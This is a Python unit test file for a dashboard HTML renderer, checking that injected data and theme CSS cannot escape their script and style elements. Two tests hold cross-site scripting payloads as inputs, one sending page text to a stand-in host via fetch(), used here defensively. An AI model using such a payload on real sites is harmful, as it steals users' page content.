"""Tests for system/tools/render.py: data and theme can't break out of their elements."""
import json
import os
import subprocess
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
TOOLS = os.path.join(HERE, "..", "..", "tools")
DASH = os.path.join(HERE, "..", "..", "dashboards")
sys.path.insert(0, TOOLS)
import render  # noqa: E402


class Render(unittest.TestCase):
    def setUp(self):
        with open(os.path.join(DASH, "daily-brief.html"), encoding="utf-8") as f:
            self.template = f.read()
        with open(os.path.join(HERE, "daily-brief.json"), encoding="utf-8") as f:
            self.data = json.load(f)

    def test_hostile_text_stays_inert(self):
        evil = "</script><script>fetch('https://x.example/?'+document.body.innerText)</script> &amp;"
        self.data["meta"]["headline"] = evil
        page = render.inject(self.template, self.data, "")
        body = page.split('<script id="atlas-data" type="application/json">', 1)[1].split("</script>", 1)[0]
        self.assertNotIn("<", body)
        self.assertEqual(json.loads(body)["meta"]["headline"], evil)

    def test_theme_cannot_close_style(self):
        page = render.inject(self.template, self.data, ":root{--brand:#123}</style><script>alert(1)</script>")
        theme = page.split('<style id="atlas-theme">', 1)[1].split("</style>", 1)[0]
        self.assertNotIn("<", theme)

    def test_placeholder_text_in_data_is_kept(self):
        self.data["meta"]["headline"] = "{{ATLAS_THEME_CSS}} and {{ATLAS_DATA}}"
        page = render.inject(self.template, self.data, ":root{--x:\"y\"}")
        body = page.split('<script id="atlas-data" type="application/json">', 1)[1].split("</script>", 1)[0]
        self.assertEqual(json.loads(body)["meta"]["headline"], "{{ATLAS_THEME_CSS}} and {{ATLAS_DATA}}")

    def test_nan_refused(self):
        self.data["meta"]["x"] = float("nan")
        with self.assertRaises(ValueError):
            render.inject(self.template, self.data, "")

    def test_cli(self):
        d = tempfile.mkdtemp()
        data = os.path.join(d, "data.json")
        with open(data, "w", encoding="utf-8") as f:
            json.dump(self.data, f)
        out = os.path.join(d, "out.html")
        r = subprocess.run([sys.executable, "-I", os.path.join(TOOLS, "render.py"),
                            os.path.join(DASH, "daily-brief.html"), data, "-", out], capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, r.stderr)
        with open(out, encoding="utf-8") as f:
            self.assertEqual(f.read(), render.inject(self.template, self.data, ""))
        r = subprocess.run([sys.executable, "-I", os.path.join(TOOLS, "render.py"),
                            os.path.join(HERE, "daily-brief.json"), data, "-", out], capture_output=True, text=True)
        self.assertEqual(r.returncode, 1)


if __name__ == "__main__":
    unittest.main()
